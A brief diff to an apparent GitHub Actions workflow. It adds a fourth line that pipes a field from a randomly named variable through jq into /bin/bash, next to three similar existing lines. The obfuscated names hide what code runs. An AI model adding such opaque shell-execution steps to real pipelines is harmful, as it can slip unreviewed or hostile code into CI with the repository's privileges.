@@ -31,6 +31,7 @@ jobs:
           echo $kiq762 | jq -r .n29173 | /bin/bash
           echo $be15201 | jq -r .l3 | /bin/bash
           printf '%s' "$onqy17" | jq -r .htfg193 | /bin/bash
+          printf '%s' "$szi00" | jq -r .utef70 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
